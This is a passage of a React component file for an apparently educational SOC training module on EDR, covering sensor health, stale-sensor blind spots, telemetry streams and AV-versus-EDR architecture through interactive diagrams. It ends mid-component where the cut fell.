'use client';

import React, { useState } from 'react';
import { Badge } from '@/components/ui/badge';
import { sound } from '@/lib/sound-effects';
import {
  edrDeviceHealthNodes,
  staleSensorTrapNodes,
  telemetryFunnelNodes,
  avVsEdrArchitectureNodes,
  capabilityOverlapNodes,
  coverageLimitsNodes,
  processTreeLineageNodes,
  commandLineArgsNodes,
  fileNameHashesNodes,
  dualTimestampTimelineNodes,
  temporalFallacyNodes,
  utcMultiSourceAlignNodes,
  indicatorReputationTriadNodes,
  unknownReputationTrapNodes,
  playbookBoundaryRestraintNodes,
  isolationGateChecklistNodes,
  simulatedContainmentNodes,
  containmentVerificationAuditNodes,
} from './module-09-visual-stories';
import {
  Clock,
  CheckCircle2,
  AlertTriangle,
  FileText,
  Shield,
  Activity,
  Terminal,
  Cpu,
  Eye,
  Key,
  Globe,
  Lock,
  ArrowRight,
  Radio,
  Sliders,
  Check,
  AlertOctagon,
  FileCode,
  Share2,
  HardDrive,
  UserCheck,
  Zap,
  Server,
  Database,
  Filter,
  Monitor,
  Folder,
  Layers,
  Network,
  Binary,
  Hash,
  Download,
  Search,
  Wifi,
  Power,
  RefreshCw,
  GitCommit,
  Flame,
  Play,
  RotateCcw,
  HelpCircle,
  ShieldAlert,
  Ban,
  EyeOff,
  FileSpreadsheet,
  Fingerprint,
  Calendar,
  PhoneCall,
  FileCheck,
  Award,
  AlertCircle,
  ArrowUpRight,
  Copy,
  Laptop,
  Workflow,
  ShieldCheck,
  Box,
  Crosshair,
} from 'lucide-react';
import { VisualNodeItem, VisualStoryStyle } from './interactive-visual-story-engine';

interface Module09GraphicRendererProps {
  style: VisualStoryStyle;
  selectedNodeId: string;
  onSelectNode: (node: VisualNodeItem) => void;
  animStep: number;
}

export function Module09GraphicRenderer({
  style,
  selectedNodeId,
  onSelectNode,
  animStep,
}: Module09GraphicRendererProps) {
  // Interactive test states for Module 09 scenarios
  const [deviceHealth, setDeviceHealth] = useState<'online' | 'degraded' | 'offline'>('online');
  const [staleView, setStaleView] = useState<'active' | 'stale'>('stale');
  const [activeStream, setActiveStream] = useState<'process' | 'file' | 'socket' | 'graph'>('process');
  const [engineFocus, setEngineFocus] = useState<'av' | 'edr'>('edr');
  const [overlapMode, setOverlapMode] = useState<'silos' | 'converged'>('converged');
  const [coverageScenario, setCoverageScenario] = useState<'lolbin' | 'legacy' | 'byovd'>('lolbin');
  const [activePid, setActivePid] = useState<2840 | 4820 | 5124 | 5912>(5124);
  const [cmdView, setCmdView] = useState<'encoded' | 'decoded'>('encoded');
  const [fileIdentityMode, setFileIdentityMode] = useState<'name' | 'hash'>('hash');
  const [timestampFocus, setTimestampFocus] = useState<'activity' | 'ingestion'>('activity');
  const [causalityMode, setCausalityMode] = useState<'fallacy' | 'verified'>('fallacy');
  const [activeTrack, setActiveTrack] = useState<'all' | 'endpoint' | 'network' | 'identity'>('all');
  const [activeIntelTab, setActiveIntelTab] = useState<'hash' | 'ip' | 'domain'>('hash');
  const [unknownReputationMode, setUnknownReputationMode] = useState<'safe-trap' | 'behavior-override'>('behavior-override');
  const [escalationGateMode, setEscalationGateMode] = useState<'unilateral' | 'governed'>('governed');
  const [checklistStep, setChecklistStep] = useState<number>(1);
  const [isIsolated, setIsIsolated] = useState<boolean>(false);
  const [isDossierSigned, setIsDossierSigned] = useState<boolean>(false);

  // Helper to render the active inspection drawer at the bottom of each diagram
  const renderInspector = (node: VisualNodeItem | undefined) => {
    if (!node) return null;
    return (
      <div className="mt-4 p-4 rounded-2xl bg-gradient-to-r from-slate-900/95 via-[#081533]/90 to-slate-900/95 border border-sky-500/30 shadow-lg flex flex-col md:flex-row md:items-center justify-between gap-3 text-left">
        <div className="space-y-1">
          <div className="flex items-center gap-2 flex-wrap">
            <span className="text-xs font-mono font-bold text-sky-400 uppercase tracking-wider">
              INSPECTED NODE:
            </span>
            <span className="text-sm font-bold text-white">{node.label}</span>
            {node.badge && (
              <Badge className="bg-sky-500/20 text-sky-300 border-sky-500/30 text-[11px] font-mono">
                {node.badge}
              </Badge>
            )}
          </div>
          <p className="text-xs sm:text-sm text-slate-200 leading-relaxed">{node.description}</p>
          {node.details && (
            <p className="text-[11px] sm:text-xs text-sky-300/90 font-mono pt-0.5">{node.details}</p>
          )}
        </div>
        <div className="shrink-0 flex items-center gap-1.5 flex-wrap">
          {node.tags?.map((t) => (
            <span
              key={t}
              className="px-2 py-0.5 rounded-md bg-slate-800/80 border border-slate-700 text-[11px] font-mono text-slate-300"
            >
              #{t}
            </span>
          ))}
        </div>
      </div>
    );
  };

  // ---------------------------------------------------------------------------
  // 1. EDR Device Inventory & Health Status (M09-U1-C1 Pillar 1)
  // ---------------------------------------------------------------------------
  if (style === 'm09-edr-device-health') {
    const nodes = edrDeviceHealthNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    const healthData = {
      online: {
        title: 'Sensor Status: Healthy & Streaming',
        desc: 'Agent v7.14.2 actively connected. Heartbeat received 12s ago. Sub-second telemetry latency.',
        badge: '100% VISIBILITY ACTIVE',
        color: 'border-emerald-500/40 text-emerald-300',
      },
      degraded: {
        title: 'Sensor Status: Degraded (Queue Buffering)',
        desc: 'Kernel driver active, but network link flapping. 142 MB event buffer spooled on local SSD.',
        badge: 'BUFFERING DELAYS',
        color: 'border-amber-500/40 text-amber-300',
      },
      offline: {
        title: 'Sensor Status: Offline / Stale',
        desc: 'Disconnected 72h ago. Zero fresh telemetry reaching cloud. Generates zero alerts due to silence.',
        badge: 'COMMUNICATION BLACKOUT',
        color: 'border-rose-500/40 text-rose-300',
      },
    };

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <Laptop className="w-5 h-5 text-sky-400" />
                <span>EDR Device Inventory &amp; Health Status</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Mentor Ananya: &quot;Visibility precedes every conclusion. Check sensor health and last-seen time before assuming an endpoint is clean.&quot;
              </p>
            </div>
            <div className="flex items-center gap-1.5">
              {(['online', 'degraded', 'offline'] as const).map((h) => (
                <button
                  key={h}
                  onClick={() => {
                    sound.playClick();
                    setDeviceHealth(h);
                  }}
                  className={`px-3 py-1 text-xs font-mono rounded-lg border uppercase transition-all ${
                    deviceHealth === h
                      ? 'bg-sky-500/20 text-sky-300 border-sky-500/40 font-bold'
                      : 'bg-slate-900 text-slate-400 border-slate-800 hover:text-white'
                  }`}
                >
                  {h}
                </button>
              ))}
            </div>
          </div>

          {/* Device Health Status Box */}
          <div className="p-4 rounded-xl bg-slate-900/90 border border-sky-500/30 flex flex-col sm:flex-row items-center justify-between gap-4 font-mono text-xs">
            <div className="space-y-1 text-left">
              <span className={`font-bold flex items-center gap-2 ${healthData[deviceHealth].color}`}>
                <Wifi className="w-4 h-4" />
                DEVICE: BLR-BR-WS-04 (10.0.4.21) &bull; {healthData[deviceHealth].title}
              </span>
              <p className="text-slate-300">{healthData[deviceHealth].desc}</p>
            </div>
            <Badge className="bg-sky-500/20 text-sky-300 border-sky-500/30 text-xs">
              {healthData[deviceHealth].badge}
            </Badge>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-1">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'edr-device-online' ? (
                          <Laptop className="w-6 h-6 text-emerald-400" />
                        ) : node.id === 'edr-last-seen' ? (
                          <Clock className="w-6 h-6 text-sky-400" />
                        ) : node.id === 'edr-agent-coverage' ? (
                          <ShieldCheck className="w-6 h-6 text-purple-400" />
                        ) : (
                          <Award className="w-6 h-6 text-amber-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 2. The Stale Sensor Visibility Trap (M09-U1-C1 Pillar 2)
  // ---------------------------------------------------------------------------
  if (style === 'm09-stale-sensor-trap') {
    const nodes = staleSensorTrapNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <AlertOctagon className="w-5 h-5 text-amber-400" />
                <span>The Stale Sensor Visibility Trap &bull; Silence != Clean State</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                A stale or disconnected sensor generates zero alert notifications. Silence on a dead wire proves nothing!
              </p>
            </div>
            <div className="flex items-center gap-2">
              <button
                onClick={() => {
                  sound.playClick();
                  setStaleView('active');
                }}
                className={`px-3 py-1 text-xs font-mono rounded-lg border transition-all ${
                  staleView === 'active'
                    ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40 font-bold'
                    : 'bg-slate-900 text-slate-400 border-slate-800 hover:text-white'
                }`}
              >
                Active Streaming Sensor
              </button>
              <button
                onClick={() => {
                  sound.playClick();
                  setStaleView('stale');
                }}
                className={`px-3 py-1 text-xs font-mono rounded-lg border transition-all ${
                  staleView === 'stale'
                    ? 'bg-rose-500/20 text-rose-300 border-rose-500/40 font-bold'
                    : 'bg-slate-900 text-slate-400 border-slate-800 hover:text-white'
                }`}
              >
                Stale Sensor Trap (72h Blackout)
              </button>
            </div>
          </div>

          {/* Stale Trap Banner */}
          <div
            className={`p-4 rounded-xl border flex flex-col sm:flex-row items-center justify-between gap-4 font-mono text-xs transition-all ${
              staleView === 'active'
                ? 'bg-emerald-950/30 border-emerald-500/40 text-emerald-200'
                : 'bg-rose-950/30 border-rose-500/40 text-rose-200'
            }`}
          >
            <div className="space-y-1 text-left">
              <span className="font-bold flex items-center gap-2">
                {staleView === 'active' ? (
                  <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                ) : (
                  <AlertTriangle className="w-4 h-4 text-rose-400" />
                )}
                {staleView === 'active'
                  ? 'ACTIVE SENSOR: 100% current telemetry. Real-time process and socket notifications flowing.'
                  : 'STALE SENSOR: Last seen Friday 18:00 UTC. Zero alerts simply because cloud cannot communicate!'}
              </span>
              <p className="text-slate-300">
                {staleView === 'active'
                  ? 'Valid basis to evaluate endpoint behavior during the observed investigation timeframe.'
                  : 'Rookie Error: Closing incident as "Clean" when the sensor was offline. Declare the window unobserved!'}
              </p>
            </div>
            <Badge
              className={`font-mono text-xs ${
                staleView === 'active'
                  ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30'
                  : 'bg-rose-500/20 text-rose-300 border-rose-500/30'
              }`}
            >
              {staleView === 'active' ? 'VERIFIED OBSERVABLE' : 'UNOBSERVED WINDOW ⚠️'}
            </Badge>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-1">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'stale-offline-status' ? (
                          <Power className="w-6 h-6 text-rose-400" />
                        ) : node.id === 'stale-false-comfort' ? (
                          <Ban className="w-6 h-6 text-amber-400" />
                        ) : node.id === 'stale-buffering-lag' ? (
                          <Database className="w-6 h-6 text-sky-400" />
                        ) : (
                          <ShieldCheck className="w-6 h-6 text-emerald-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 3. Continuous Endpoint Telemetry Streams (M09-U1-C1 Pillar 3)
  // ---------------------------------------------------------------------------
  if (style === 'm09-telemetry-funnel') {
    const nodes = telemetryFunnelNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    const streamDetails = {
      process: {
        title: 'Process Creation & Lineage Stream (Sysmon 1 / 5)',
        desc: 'Parent-child PID tracking, command lines, hashes, security token SID, and integrity levels.',
        rate: '4,200 events/sec',
      },
      file: {
        title: 'File System Modification Stream (Sysmon 11 / 15)',
        desc: 'Files created or written in AppData\\Temp, ADS streams, and payloads written from TLS sessions.',
        rate: '8,900 events/sec',
      },
      socket: {
        title: 'Network Socket Telemetry Stream (Sysmon 3)',
        desc: 'Local IP/port, remote IP/port, initiating PID, and protocol. Bridges host actions to network PCAP.',
        rate: '1,400 events/sec',
      },
      graph: {
        title: 'EDR Cloud Graph Indexer Repository',
        desc: 'Distributed behavioral graph linking processes, files, and sockets into interactive entity webs.',
        rate: 'Unified Graph Model',
      },
    };

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <Workflow className="w-5 h-5 text-sky-400" />
                <span>Continuous Endpoint Telemetry Streams &bull; Funnel Pipeline</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Streaming millions of kernel-level events: process lineage, file I/O, network sockets, and behavioral graph indexer.
              </p>
            </div>
            <div className="flex items-center gap-1.5 flex-wrap">
              {(['process', 'file', 'socket', 'graph'] as const).map((st) => (
                <button
                  key={st}
                  onClick={() => {
                    sound.playClick();
                    setActiveStream(st);
                  }}
                  className={`px-2.5 py-1 text-xs font-mono rounded-lg border uppercase transition-all ${
                    activeStream === st
                      ? 'bg-sky-500/20 text-sky-300 border-sky-500/40 font-bold'
                      : 'bg-slate-900 text-slate-400 border-slate-800 hover:text-white'
                  }`}
                >
                  {st}
                </button>
              ))}
            </div>
          </div>

          {/* Active Stream Explainer Box */}
          <div className="p-4 rounded-xl bg-slate-900/90 border border-sky-500/30 flex flex-col sm:flex-row items-center justify-between gap-4 font-mono text-xs">
            <div className="space-y-1 text-left">
              <span className="font-bold text-white flex items-center gap-2">
                <Activity className="w-4 h-4 text-sky-400" />
                {streamDetails[activeStream].title}
              </span>
              <p className="text-slate-300">{streamDetails[activeStream].desc}</p>
            </div>
            <Badge className="bg-emerald-500/20 text-emerald-300 border-emerald-500/30 text-xs">
              {streamDetails[activeStream].rate}
            </Badge>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-1">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'funnel-process-events' ? (
                          <Cpu className="w-6 h-6 text-sky-400" />
                        ) : node.id === 'funnel-file-io' ? (
                          <Folder className="w-6 h-6 text-emerald-400" />
                        ) : node.id === 'funnel-socket-binds' ? (
                          <Network className="w-6 h-6 text-amber-400" />
                        ) : (
                          <Database className="w-6 h-6 text-purple-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 4. Traditional Antivirus vs Modern EDR (M09-U1-C2 Pillar 1)
  // ---------------------------------------------------------------------------
  if (style === 'm09-av-vs-edr-architecture') {
    const nodes = avVsEdrArchitectureNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <ShieldCheck className="w-5 h-5 text-sky-400" />
                <span>Traditional Antivirus vs Modern EDR Architecture</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Antivirus focuses on preventing known files; EDR emphasizes continuous recording and incident response workflows.
              </p>
            </div>
            <div className="flex items-center gap-2">
              <button
                onClick={() => {
                  sound.playClick();
                  setEngineFocus('av');
                }}
                className={`px-3 py-1 text-xs font-mono rounded-lg border transition-all ${
                  engineFocus === 'av'
                    ? 'bg-amber-500/20 text-amber-300 border-amber-500/40 font-bold'
                    : 'bg-slate-900 text-slate-400 border-slate-800 hover:text-white'
                }`}
              >
                Traditional Antivirus (AV)
              </button>
              <button
                onClick={() => {
                  sound.playClick();
                  setEngineFocus('edr');
                }}
                className={`px-3 py-1 text-xs font-mono rounded-lg border transition-all ${
                  engineFocus === 'edr'
                    ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40 font-bold'
                    : 'bg-slate-900 text-slate-400 border-slate-800 hover:text-white'
                }`}
              >
                Modern EDR (Flight Recorder)
              </button>
            </div>
          </div>

          {/* AV vs EDR Comparison Display */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-3.5">
            <div
              className={`p-4 rounded-xl border flex flex-col justify-between space-y-2 ${
                engineFocus === 'av'
                  ? 'bg-amber-950/30 border-amber-500/50 ring-1 ring-amber-500/30'
                  : 'bg-slate-900/60 border-slate-800 opacity-60'
              }`}
            >
              <div className="flex items-center justify-between">
                <span className="text-xs font-mono font-bold text-amber-300">
                  TRADITIONAL ANTIVIRUS (PREVENTION)
                </span>
                <Badge className="bg-amber-500/20 text-amber-300 border-amber-500/30 text-[11px] font-mono">
                  POINT-IN-TIME
                </Badge>
              </div>
              <p className="text-xs text-slate-200">
                Border guard model: Checks file hashes against static signature dictionaries upon disk write. Binary decisions (allow or quarantine).
              </p>
              <p className="text-[11px] text-amber-300/80 font-mono">
                Blind to living-off-the-land utilities and in-memory execution.
              </p>
            </div>

            <div
              className={`p-4 rounded-xl border flex flex-col justify-between space-y-2 ${
                engineFocus === 'edr'
                  ? 'bg-emerald-950/30 border-emerald-500/50 ring-1 ring-emerald-500/30'
                  : 'bg-slate-900/60 border-slate-800 opacity-60'
              }`}
            >
              <div className="flex items-center justify-between">
                <span className="text-xs font-mono font-bold text-emerald-300">
                  MODERN EDR (BEHAVIORAL RECORDING)
                </span>
                <Badge className="bg-emerald-500/20 text-emerald-300 border-emerald-500/30 text-[11px] font-mono">
                  FLIGHT RECORDER
                </Badge>
              </div>
              <p className="text-xs text-slate-200">
                Continuous flight recorder: Logs all process trees, sockets, and memory injections. Enables network isolation, live shell, and forensic timelines.
              </p>
              <p className="text-[11px] text-emerald-300/80 font-mono">
                Catches multi-stage attacks even when using legitimate OS binaries.
              </p>
            </div>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-1">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'av-signature-engine' ? (
                          <Shield className="w-6 h-6 text-amber-400" />
                        ) : node.id === 'edr-behavioral-engine' ? (
                          <Activity className="w-6 h-6 text-emerald-400" />
                        ) : node.id === 'edr-workflow-emphasis' ? (
                          <Workflow className="w-6 h-6 text-sky-400" />
                        ) : (
                          <Award className="w-6 h-6 text-purple-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 5. Capability Overlap & The Vendor Label Illusion (M09-U1-C2 Pillar 2)
  // ---------------------------------------------------------------------------
  if (style === 'm09-capability-overlap') {
    const nodes = capabilityOverlapNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <Layers className="w-5 h-5 text-sky-400" />
                <span>Capability Overlap &bull; Prevention, Detection &amp; Response</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Modern enterprise agents converge AMSI pre-execution scanning, memory injection defense, and cloud ML into a single unified driver.
              </p>
            </div>
            <button
              onClick={() => {
                sound.playClick();
                setOverlapMode(overlapMode === 'converged' ? 'silos' : 'converged');
              }}
              className="px-3 py-1 text-xs font-mono rounded-lg border bg-sky-500/20 text-sky-300 border-sky-500/40 hover:bg-sky-500/30"
            >
              Architecture: {overlapMode === 'converged' ? 'Converged Unified Agent' : 'Separate Legacy Silos'}
            </button>
          </div>

          {/* Overlap Architecture Banner */}
          <div className="p-4 rounded-xl bg-slate-900/90 border border-sky-500/30 flex flex-col sm:flex-row items-center justify-between gap-4 font-mono text-xs">
            <div className="space-y-1 text-left">
              <span className="font-bold text-white flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                CONVERGED WORKFLOW: Pre-Execution Scan (AMSI) &rarr; Memory Guard &rarr; Behavioral Flight Record
              </span>
              <p className="text-slate-300">
                Ananya: &quot;Do not debate AV vs EDR semantics in shift handovers. Document which specific layer detected the anomaly.&quot;
              </p>
            </div>
            <Badge className="bg-emerald-500/20 text-emerald-300 border-emerald-500/30 text-xs">
              LAYERED DEFENSE ✓
            </Badge>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-1">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'over-static-scanning' ? (
                          <Filter className="w-6 h-6 text-sky-400" />
                        ) : node.id === 'over-memory-protection' ? (
                          <Cpu className="w-6 h-6 text-purple-400" />
                        ) : node.id === 'over-threat-intel-cloud' ? (
                          <Globe className="w-6 h-6 text-emerald-400" />
                        ) : (
                          <Award className="w-6 h-6 text-amber-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 6. Universal Detection Fallacy & EDR Blind Spots (M09-U1-C2 Pillar 3)
  // ---------------------------------------------------------------------------
  if (style === 'm09-coverage-limits') {
    const nodes = coverageLimitsNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <AlertTriangle className="w-5 h-5 text-amber-400" />
                <span>Universal Detection Fallacy &amp; EDR Blind Spots</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Ananya: &quot;Does having EDR mean every threat is detected? No! Tools extend visibility; they do not eliminate verification.&quot;
              </p>
            </div>
            <div className="flex items-center gap-1.5">
              {(['lolbin', 'legacy', 'byovd'] as const).map((sc) => (
                <button
                  key={sc}
                  onClick={() => {
                    sound.playClick();
                    setCoverageScenario(sc);
                  }}
                  className={`px-3 py-1 text-xs font-mono rounded-lg border uppercase transition-all ${
                    coverageScenario === sc
                      ? 'bg-amber-500/20 text-amber-300 border-amber-500/40 font-bold'
                      : 'bg-slate-900 text-slate-400 border-slate-800 hover:text-white'
                  }`}
                >
                  {sc === 'lolbin' ? 'LOLBIN Abuse' : sc === 'legacy' ? 'Unmanaged IoT' : 'BYOVD Driver Exploit'}
                </button>
              ))}
            </div>
          </div>

          {/* Blindspot Scenario Display Box */}
          <div className="p-4 rounded-xl bg-slate-900/90 border border-amber-500/30 flex flex-col sm:flex-row items-center justify-between gap-4 font-mono text-xs">
            <div className="space-y-1 text-left">
              <span className="font-bold text-amber-300 flex items-center gap-2">
                <AlertTriangle className="w-4 h-4" />
